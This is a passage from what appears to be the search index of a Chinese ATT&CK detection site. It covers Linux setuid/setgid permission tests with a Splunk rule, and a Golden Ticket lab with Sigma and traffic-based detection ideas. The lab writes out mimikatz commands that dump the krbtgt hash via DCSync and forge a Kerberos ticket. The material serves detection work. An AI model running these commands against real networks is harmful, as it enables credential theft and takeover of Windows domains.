\u8be5\u6587\u4ef6\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650, \u4ece\u800c\u53ef\u4ee5\u66f4\u6539\u7528\u6237\u7684\u5bc6\u7801\u3002 setgid: \u8be5\u6743\u9650\u53ea\u5bf9\u76ee\u5f55\u6709\u6548. \u76ee\u5f55\u88ab\u8bbe\u7f6e\u8be5\u4f4d\u540e, \u4efb\u4f55\u7528\u6237\u5728\u6b64\u76ee\u5f55\u4e0b\u521b\u5efa\u7684\u6587\u4ef6\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u6240\u5c5e\u7684\u7ec4\u76f8\u540c\u7684\u7ec4\u3002 stick bit: \u8be5\u4f4d\u53ef\u4ee5\u7406\u89e3\u4e3a\u9632\u5220\u9664\u4f4d. \u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u88ab\u67d0\u7528\u6237\u5220\u9664, \u4e3b\u8981\u53d6\u51b3\u4e8e\u8be5\u6587\u4ef6\u6240\u5c5e\u7684\u7ec4\u662f\u5426\u5bf9\u8be5\u7528\u6237\u5177\u6709\u5199\u6743\u9650. \u5982\u679c\u6ca1\u6709\u5199\u6743\u9650, \u5219\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4e0d\u80fd\u88ab\u5220\u9664, \u540c\u65f6\u4e5f\u4e0d\u80fd\u6dfb\u52a0\u65b0\u7684\u6587\u4ef6. \u5982\u679c\u5e0c\u671b\u7528\u6237\u80fd\u591f\u6dfb\u52a0\u6587\u4ef6\u4f46\u540c\u65f6\u4e0d\u80fd\u5220\u9664\u6587\u4ef6, \u5219\u53ef\u4ee5\u5bf9\u6587\u4ef6\u4f7f\u7528stick bit\u4f4d. \u8bbe\u7f6e\u8be5\u4f4d\u540e, \u5c31\u7b97\u7528\u6237\u5bf9\u76ee\u5f55\u5177\u6709\u5199\u6743\u9650, \u4e5f\u4e0d\u80fd\u5220\u9664\u8be5\u6587\u4ef6\u3002","title":"\u5173\u4e8eSetuid and Setgid\u8be6\u89e3"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_1","text":"\u64cd\u4f5c\u8fd9\u4e9b\u6807\u5fd7\u4e0e\u64cd\u4f5c\u6587\u4ef6\u6743\u9650\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684, \u90fd\u662f chmod. \u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u64cd\u4f5c\uff1a","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_2","text":"chmod u+s xxx # \u8bbe\u7f6esetuid\u6743\u9650\uff0c\u52a0\u4e0asetuid\u6807\u5fd7(setuid \u53ea\u5bf9\u6587\u4ef6\u6709\u6548) chmod g+s xxx # \u8bbe\u7f6esetgid\u6743\u9650\uff0c\u52a0\u4e0asetgid\u6807\u5fd7 (setgid \u53ea\u5bf9\u76ee\u5f55\u6709\u6548) chmod o+t xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55","title":"\u65b9\u6cd5\u4e00"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_3","text":"\u91c7\u7528\u516b\u8fdb\u5236\u65b9\u5f0f. \u5bf9\u4e00\u822c\u6587\u4ef6\u901a\u8fc7\u4e09\u7ec4\u516b\u8fdb\u5236\u6570\u5b57\u6765\u7f6e\u6807\u5fd7, \u5982 666, 777, 644\u7b49. \u5982\u679c\u8bbe\u7f6e\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7, \u5219\u5728\u8fd9\u7ec4 \u6570\u5b57\u4e4b\u5916\u5916\u52a0\u4e00\u7ec4\u516b\u8fdb\u5236\u6570\u5b57. \u59824666, 2777\u7b49 chmod 4775 xxx # \u8bbe\u7f6esetuid\u6743\u9650 chmod 2775 xxx # \u8bbe\u7f6esetgid\u6743\u9650 chmod 1775 xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55 \u5728\u8fd9\u91cc\u53ea\u8bb2\u7b2c\u4e00\u4f4d8\u8fdb\u5236\u4ee3\u8868\u6743\u9650 0: \u4e0d\u8bbe\u7f6e\u7279\u6b8a\u6743\u9650 1\uff1a\u53ea\u8bbe\u7f6esticky 2\uff1a\u53ea\u8bbe\u7f6eSGID 3\uff1a\u53ea\u8bbe\u7f6eSGID\u548csticky 4\uff1a\u53ea\u8bbe\u7f6eSUID 5\uff1a\u53ea\u8bbe\u7f6eSUID\u548csticky 6\uff1a\u53ea\u8bbe\u7f6eSUID\u548cSGID 7\uff1a\u8bbe\u7f6e3\u79cd\u6743\u9650 \u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u6807\u5fd7\u540e, \u53ef\u4ee5\u7528 ls -l \u6765\u67e5\u770b. \u5982\u679c\u6709\u8fd9\u4e9b\u6807\u5fd7, \u5219\u4f1a\u5728\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7\u4f4d\u7f6e\u4e0a\u663e\u793a\u3002\u90a3\u4e48\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7x\u5230\u54ea\u91cc\u53bb\u4e86\u5462? \u7cfb\u7edf\u662f\u8fd9\u6837\u89c4\u5b9a\u7684, \u5982\u679c\u672c\u6765\u5728\u8be5\u4f4d\u4e0a\u6709x, \u5219\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7\u663e\u793a\u4e3a\u5c0f\u5199\u5b57\u6bcd (s, s, t). \u5426\u5219, \u663e\u793a\u4e3a\u5927\u5199\u5b57\u6bcd (S, S, T)\u3002 \u6ce8\uff1a\u5728UNIX\u7cfb\u7edf\u5bb6\u65cf\u91cc\uff0c\u6587\u4ef6\u6216\u76ee\u5f55\u6743\u9650\u7684\u63a7\u5236\u5206\u522b\u4ee5\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c3\u79cd\u4e00\u822c\u6743\u9650\u6765\u533a\u5206\uff0c\u53e6\u67093\u79cd\u7279\u6b8a\u6743\u9650 \u53ef\u4f9b\u8fd0\u7528\uff0c\u518d\u642d\u914d\u62e5\u6709\u8005\u4e0e\u6240\u5c5e\u7fa4\u7ec4\u7ba1\u7406\u6743\u9650\u8303\u56f4\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528chmod\u6307\u4ee4\u53bb\u53d8\u66f4\u6587\u4ef6\u4e0e\u76ee\u5f55\u7684\u6743\u9650\uff0c\u8bbe\u7f6e\u65b9\u5f0f \u91c7\u7528\u6587\u5b57\u6216\u6570\u5b57\u4ee3\u53f7\u7686\u53ef\u3002\u7b26\u53f7\u8fde\u63a5\u7684\u6743\u9650\u65e0\u6cd5\u53d8\u66f4\uff0c\u5982\u679c\u60a8\u5bf9\u7b26\u53f7\u8fde\u63a5\u4fee\u6539\u6743\u9650\uff0c\u5176\u6539\u53d8\u4f1a\u4f5c\u7528\u5728\u88ab\u8fde\u63a5\u7684\u539f\u59cb \u6587\u4ef6\u3002\u6743\u9650\u8303\u56f4\u7684\u8868\u793a\u6cd5\u5982\u4e0b\uff1a u\uff1aUser\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u62e5\u6709\u8005\u3002 g\uff1aGroup\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u5c5e\u7fa4\u7ec4\u3002 o\uff1aOther\uff0c\u9664\u4e86\u6587\u4ef6\u6216\u76ee\u5f55\u62e5\u6709\u8005\u6216\u6240\u5c5e\u7fa4\u7ec4\u4e4b\u5916\uff0c\u5176\u4ed6\u7528\u6237\u7686\u5c5e\u4e8e\u8fd9\u4e2a\u8303\u56f4\u3002 a\uff1aAll\uff0c\u5373\u5168\u90e8\u7684\u7528\u6237\uff0c\u5305\u542b\u62e5\u6709\u8005\uff0c\u6240\u5c5e\u7fa4\u7ec4\u4ee5\u53ca\u5176\u4ed6\u7528\u6237\u3002 \u6709\u5173\u6743\u9650\u4ee3\u53f7\u7684\u90e8\u5206\uff0c\u5217\u8868\u4e8e\u4e0b\uff1a r\uff1a\u8bfb\u53d6\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"4\"\u3002 w\uff1a\u5199\u5165\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"2\"\u3002 x\uff1a\u6267\u884c\u6216\u5207\u6362\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"1\"\u3002 -\uff1a\u4e0d\u5177\u4efb\u4f55\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"0\"\u3002 s\uff1a\u7279\u6b8a?b>\u529f\u80fd\u8bf4\u660e\uff1a\u53d8\u66f4\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u3002","title":"\u65b9\u6cd5\u4e8c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_4","text":"bash\u5386\u53f2\u8bb0\u5f55","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_5","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_6","text":"icbc@icbc:/hacker$ ls -l -rw-r--r-- 1 root root 0 7\u6708 19 17:22 bas.txt icbc@icbc:/hacker$ sudo chmod u+s bas.txt icbc@icbc:/hacker$ ls -l -rwSr--r-- 1 root root 0 7\u6708 19 17:22 bas.txt icbc@icbc:/hacker$ sudo chmod g+s bas.txt icbc@icbc:/hacker$ ls -l -rwSr-Sr-- 1 root root 0 7\u6708 19 17:22 bas.txt","title":"\u65b9\u6cd5\u4e00/"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_7","text":"icbc@icbc:/hacker$ ls -l -rwxr-xr-x 1 root root 0 8\u6708 28 15:16 admin.txt icbc@icbc:/hacker$ sudo chmod 4777 admin.txt icbc@icbc:/hacker$ ls -l -rwsrwxrwx 1 root root 0 8\u6708 28 15:16 admin.txt icbc@icbc:/hacker$ sudo chmod 2777 admin.txt icbc@icbc:/hacker$ ls -l -rwxrwsrwx 1 root root 0 8\u6708 28 15:16 admin.txt","title":"\u65b9\u6cd5\u4e8c/"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_8","text":"","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_9","text":"icbc@icbc:/hacker$ history 650 chmod u+s bas.txt 651 sudo chmod u+s bas.txt 652 ls -l 653 sudo chmod g+s bas.txt","title":"\u65b9\u6cd5\u4e00 /"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_10","text":"icbc@icbc:/hacker$ history 683 sudo chmod 4777 admin.txt 684 ls -l 685 sudo chmod 2777 admin.txt","title":"\u65b9\u6cd5\u4e8c /"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_11","text":"splunk\u68c0\u6d4b\u89c4\u5219\uff1aindex=linux sourcetype=bash_history \"chmod 4*** \" OR \"chmod 2*** \" OR \"chmod u+s\" OR \"chmod g+s\" | table host,user_name,bash_command","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#_12","text":"MITRE-ATT&CK-T1548-001 https://attack.mitre.org/techniques/T1548/001/ linux\u6587\u4ef6\u7279\u6b8a\u6743\u9650 https://www.cnblogs.com/patriot/p/7874725.html linux\u4e2dchmod\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/lianstyle/p/8571975.html linux\u4e0b\u7684chmod\u53c2\u6570\u8be6\u89e3 https://blog.csdn.net/taiyang1987912/article/details/41121131","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/","text":"T1550-003-win-\u9ec4\u91d1\u7968\u636e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684Kerberos\u7968\u8bc1\u201c\u4f20\u9012\u7968\u8bc1\u201d\uff0c\u4f7f\u5176\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u7968\u8bc1\uff08PtT\uff09\u662f\u4e00\u79cd\u4f7f\u7528Kerberos\u7968\u8bc1\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\uff0c\u65e0\u9700\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002Kerberos\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u7528\u4f5c\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002 \u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u6709\u6548\u7684Kerberos\u7968\u6709\u6548\u7684\u5e10\u6237\u88ab\u6355\u83b7OS\u51ed\u8bc1\u503e\u9500\u3002\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\uff0c\u53ef\u4ee5\u83b7\u5f97\u7528\u6237\u7684\u670d\u52a1\u7968\u8bc1\u6216\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u3002\u670d\u52a1\u7968\u8bc1\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u4ee5\u7528\u4e8e\u4ece\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1\u4ee5\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002 \u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6Silver Ticket\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u8bc1\u4ee5\u8bbf\u95ee\u8be5\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002 \u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u5e10\u6237KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u53d6\u57df\u7684Golden Ticket\uff0c\u8fd9\u53ef\u4ee5\u4e3aActive Directory\u4e2d\u7684\u4efb\u4f55\u5e10\u6237\u751f\u6210TGT\u3002 \u6d4b\u8bd5\u6848\u4f8b \u9ec4\u91d1\u7968\u636e\uff08golden ticket\uff09\uff1a\u4f2a\u9020\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u4e5f\u88ab\u79f0\u4e3a\u8ba4\u8bc1\u7968\u636e\u3002\u4e0e\u5176\u8bf4\u662f\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\uff0c\u4e0d\u5982\u8bf4\u662f\u4e00\u79cd\u540e\u95e8\uff0c\u5f53\u57df\u63a7\u6743\u9650\u6389\u540e\uff0c\u518d\u91cd\u65b0\u83b7\u53d6\u6743\u9650\uff0c\u56e0\u4e3a\u5e38\u89c1\u7684\u5728\u57df\u4e2d\u7ba1\u7406\u5458\u77e5\u9053\u81ea\u5df1\u88ab\u5165\u4fb5\u4e86 \u5f80\u5f80\u53ea\u662f\u7b80\u5355\u7684\u4fee\u6539\u57df\u7ba1\u7684\u8d26\u53f7 \u6070\u6070krbtgt\u5374\u88ab\u5ffd\u7565\u2026 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6d4b\u8bd5\u73af\u5883 Windows server 2016\uff08AD\u57df\u63a7\uff09 Win 7\uff08\u9776\u673a\uff09 \u6d4b\u8bd5\u8fc7\u7a0b \u5c1d\u8bd5\u8bbf\u95eeDC\u76ee\u5f55 dir \\\\ICBC.abcc.org\\c$\\ \u5bfc\u51fakrbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177) lsadump::dcsync /domain:abcc.org /user:krbtgt #domian\uff1a\u540e\u9762\u662f\u57df\u63a7\u540d user\u540e\u9762\u662fkrbtgt\u7528\u6237 \u5728\u57df\u5185\u5176\u4ed6Client(\u7528\u6237\u673a\u5668)\u4e0a\u4f7f\u7528\u5176\u4ed6\u57df\u7ba1\u7406\u5458\u6765\u6293\u53d6krbtgt\u7528\u6237\u7684hash\u548csid(\u4f7f\u7528mimikatz.exe\u5de5\u5177)\uff0c\u8fd9\u91cc\u547d\u4ee4\u548c\u4e0a\u9762\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684\u3002\u4e5f\u53ef\u4ee5\u5229\u7528\u5176\u5b83\u65b9\u6cd5\u83b7\u53d6krbtgt\u7684NTML hash \u6e05\u9664\u81ea\u5df1Client\u7aef(\u57df\u5185\u5176\u4ed6\u673a\u5668)\u7684\u7968\u636e \u5728\u57df\u63a7\u4e0a\u9762\u6210\u529f\u6293\u53d6\u4e86hash\u548csid\uff0c\u5c06hash\u548csid\u590d\u5236\u5230\u5176\u4ed6\u57df\u5185\u673a\u5668\u4e2d\uff0c\u4e5f\u5c31\u662fClient\u7aef\uff0c\u7136\u540e\u5728mimikatz.exe\u6267\u884ckerberos::list\u67e5\u770b\u6211\u4eec\u5f53\u524d\u7684\u7968\u636e\u3002 \u5982\u679c\u5b58\u5728\u5176\u5b83\u51ed\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528kerberos::purge\u6e05\u9664\u5f53\u524d\u7528\u6237\u7968\u636e\u3002 \u4f2a\u9020TGT\u7968\u636e \u65b9\u6cd5\u4e00 mimikatz.exe \"kerberos::golden /domain:<\u57df\u540d> /sid:<\u57dfSID> /rc4:<KRBTGT NTLM Hash> /user:<\u4efb\u610f\u7528\u6237\u540d> /ptt\" exit \u9a8c\u8bc1\u653b\u51fb\u6548\u679c dir \\\\ICBC.abcc.org\\c$\\ \u65b9\u6cd5\u4e8c mimikatz# kerberos::gloden /domain:*.com /sid:<\u57dfSID> /krbtgt: <KRBTGT NTLM Hash> /user:<\u4efb\u610f\u7528\u6237\u540d> /ticket:test.kribi or mimikatz# kerberos::gloden /domain:*.com /sid: <\u57dfSID> /aes256: <KRBTGT aes256> /user: <\u4efb\u610f\u7528\u6237\u540d> /ticket:test.kribi \u5bfc\u5165*.kribi\u6587\u4ef6 \u9a8c\u8bc1\u662f\u5426\u6210\u529f \u6d4b\u8bd5\u7559\u75d5 \u6b63\u5e38\u65e5\u5fd7\u75d5\u8ff9 \u5f02\u5e38\u65e5\u5fd7\u75d5\u8ff9 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: windows\u672c\u5730\u8d26\u6237\u64cd\u7eb5 description: win7\u6d4b\u8bd5 references: tags: T1550-003 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4624 #\u8d26\u6237\u767b\u5f55 Account domain: '*.*' #\u53ef\u53c2\u8003\u793a\u4f8b\u65e5\u5fd7\u8fdb\u884c\u7406\u89e3 selection2: EventID: 4672 #\u7279\u6b8a\u767b\u5f55 Account domain: _ #\u8d26\u6237\u57df\u4e3a\u7a7a timeframe: last 5s condition: all of them level: medium \u5efa\u8bae \u6700\u540e\uff0c\u5b58\u5728\u4e00\u4e9b\u95ee\u9898\uff0cmimikatz\u6700\u65b0\u7248\u672c\u5df2\u7ecf\u66f4\u65b0\u4fee\u590d\u4e86\u4e00\u4e0b\u95ee\u9898\uff0c\u901a\u8fc7\u4e0a\u8ff0\u6b64\u7279\u5f81\u68c0\u6d4b\u9ec4\u91d1\u7968\u636e\u53ef\u80fd\u4f1a\u4ea7\u751f\u8bef\u62a5\u6216\u8005\u6f0f\u6d1e\uff0c\u5efa\u8bae\u91c7\u7528\u504f\u5411\u6d41\u91cf\u4fa7\u7684\u68c0\u6d4b\u65b9\u6cd5\u8fdb\u884c\u68c0\u6d4b\uff0c\u601d\u8def\u5982\u4e0b\u3002 1.AS-REP\u8fd4\u56de\u7684Ticket\u5b57\u6bb5\u4e2d\uff0c\u867d\u7136\u7ecf\u8fc7krbtgt\u5bc6\u7801\u7684\u52a0\u5bc6\uff0c\u4f46\u6211\u4eec\u4ecd\u7136\u53ef\u4ee5\u5bf9\u5176\u8ba1\u7b97\u552f\u4e00\u6458\u8981\u503c\u3002 2.\u8ddf\u8e2a\u6bcf\u4e00\u6b21\u7684AS-REP TGT\u7968\u636e\u9881\u53d1\uff0c\u8bb0\u5f55\u4e0bTicket Hash\uff0c\u5b58\u5165\u5217\u8868A\u3002 3.\u5bf9\u6bcf\u4e00\u6b21TGS-REQ\u4e2dTGT Hash\u8fdb\u884c\u786e\u8ba4\uff0c\u5224\u65ad\u8be5\u503c\u662f\u5426\u5b58\u5728\u4e8e\u5df2\u77e5\u9881\u53d1\u8fc7\u7684TGT\u5217\u8868A\u4e2d\u3002\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u5c5e\u4e8e\u4f2a\u9020\u7684TGT\uff0c\u5373\u9ec4\u91d1\u7968\u636e\u3002 4.\u5217\u8868A\u7684\u5185\u5bb9\u53ef\u8bbe\u7f6e\u8fc7\u671f\u65f6\u95f4\uff0cTGT\u548cST\u7684\u9ed8\u8ba4\u6700\u5927\u6709\u6548\u671f\u90fd\u662f10\u5c0f\u65f6\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1550-003 https://attack.mitre.org/techniques/T1550/003/","title":"T1550-003-win-\u9ec4\u91d1\u7968\u636e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#t1550-003-win-","text":"","title":"T1550-003-win-\u9ec4\u91d1\u7968\u636e"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u88ab\u76d7\u7684Kerberos\u7968\u8bc1\u201c\u4f20\u9012\u7968\u8bc1\u201d\uff0c\u4f7f\u5176\u5728\u73af\u5883\u4e2d\u6a2a\u5411\u79fb\u52a8\uff0c\u4ece\u800c\u7ed5\u8fc7\u6b63\u5e38\u7684\u7cfb\u7edf\u8bbf\u95ee\u63a7\u5236\u3002\u4f20\u9012\u7968\u8bc1\uff08PtT\uff09\u662f\u4e00\u79cd\u4f7f\u7528Kerberos\u7968\u8bc1\u5bf9\u7cfb\u7edf\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u7684\u65b9\u6cd5\uff0c\u65e0\u9700\u8bbf\u95ee\u5e10\u6237\u5bc6\u7801\u3002Kerberos\u8eab\u4efd\u9a8c\u8bc1\u53ef\u4ee5\u7528\u4f5c\u6a2a\u5411\u79fb\u52a8\u5230\u8fdc\u7a0b\u7cfb\u7edf\u7684\u7b2c\u4e00\u6b65\u3002 \u5728\u8fd9\u79cd\u6280\u672f\u4e2d\uff0c\u6709\u6548\u7684Kerberos\u7968\u6709\u6548\u7684\u5e10\u6237\u88ab\u6355\u83b7OS\u51ed\u8bc1\u503e\u9500\u3002\u53d6\u51b3\u4e8e\u8bbf\u95ee\u7ea7\u522b\uff0c\u53ef\u4ee5\u83b7\u5f97\u7528\u6237\u7684\u670d\u52a1\u7968\u8bc1\u6216\u7968\u8bc1\u6388\u4e88\u7968\u8bc1\uff08TGT\uff09\u3002\u670d\u52a1\u7968\u8bc1\u5141\u8bb8\u8bbf\u95ee\u7279\u5b9a\u8d44\u6e90\uff0c\u800cTGT\u53ef\u4ee5\u7528\u4e8e\u4ece\u7968\u8bc1\u6388\u4e88\u670d\u52a1\uff08TGS\uff09\u8bf7\u6c42\u670d\u52a1\u7968\u8bc1\u4ee5\u8bbf\u95ee\u7528\u6237\u6709\u6743\u8bbf\u95ee\u7684\u4efb\u4f55\u8d44\u6e90\u3002 \u53ef\u4ee5\u4e3a\u4f7f\u7528Kerberos\u4f5c\u4e3a\u8eab\u4efd\u9a8c\u8bc1\u673a\u5236\u7684\u670d\u52a1\u83b7\u53d6Silver Ticket\uff0c\u5e76\u7528\u4e8e\u751f\u6210\u7968\u8bc1\u4ee5\u8bbf\u95ee\u8be5\u7279\u5b9a\u8d44\u6e90\u548c\u627f\u8f7d\u8be5\u8d44\u6e90\u7684\u7cfb\u7edf\uff08\u4f8b\u5982\uff0cSharePoint\uff09\u3002 \u53ef\u4ee5\u4f7f\u7528\u5bc6\u94a5\u5206\u53d1\u670d\u52a1\u5e10\u6237KRBTGT\u5e10\u6237NTLM\u54c8\u5e0c\u6765\u83b7\u53d6\u57df\u7684Golden Ticket\uff0c\u8fd9\u53ef\u4ee5\u4e3aActive Directory\u4e2d\u7684\u4efb\u4f55\u5e10\u6237\u751f\u6210TGT\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_1","text":"\u9ec4\u91d1\u7968\u636e\uff08golden ticket\uff09\uff1a\u4f2a\u9020\u7968\u636e\u6388\u4e88\u7968\u636e\uff08TGT\uff09\uff0c\u4e5f\u88ab\u79f0\u4e3a\u8ba4\u8bc1\u7968\u636e\u3002\u4e0e\u5176\u8bf4\u662f\u4e00\u79cd\u653b\u51fb\u65b9\u5f0f\uff0c\u4e0d\u5982\u8bf4\u662f\u4e00\u79cd\u540e\u95e8\uff0c\u5f53\u57df\u63a7\u6743\u9650\u6389\u540e\uff0c\u518d\u91cd\u65b0\u83b7\u53d6\u6743\u9650\uff0c\u56e0\u4e3a\u5e38\u89c1\u7684\u5728\u57df\u4e2d\u7ba1\u7406\u5458\u77e5\u9053\u81ea\u5df1\u88ab\u5165\u4fb5\u4e86 \u5f80\u5f80\u53ea\u662f\u7b80\u5355\u7684\u4fee\u6539\u57df\u7ba1\u7684\u8d26\u53f7 \u6070\u6070krbtgt\u5374\u88ab\u5ffd\u7565\u2026","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_4","text":"Windows server 2016\uff08AD\u57df\u63a7\uff09 Win 7\uff08\u9776\u673a\uff09","title":"\u6d4b\u8bd5\u73af\u5883"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#_5","text":"","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#dc","text":"dir \\\\ICBC.abcc.org\\c$\\","title":"\u5c1d\u8bd5\u8bbf\u95eeDC\u76ee\u5f55"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1550-003-win-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/#krbtgthashsidmimikatzexe","text":"lsadump::dcsync /domain:abcc.org /user:krbtgt #domian\uff1a\u540e\u9762\u662f\u57df\u63a7\u540d user\u540e\u9762\u662fkrbtgt\u7528\u6237 